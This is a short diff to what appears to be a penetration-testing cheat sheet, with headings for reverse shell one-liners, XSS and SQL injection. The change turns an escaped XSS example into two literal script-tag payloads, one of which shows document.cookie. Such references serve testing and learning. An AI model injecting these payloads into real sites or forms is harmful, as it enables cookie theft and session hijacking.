@@ -13,8 +13,12 @@ Reverse shell one-liners:
 XSS
 ---
 
-(script)alert("XSS")(/script) - use angle brackets instead of parentheses
+ Use angle brackets instead of parentheses.
 
+```javascript
+<script>alert("XSS")</script>
+<script>alert(document.cookie)</script>
+```
 
 SQL INJECTION
 -------------
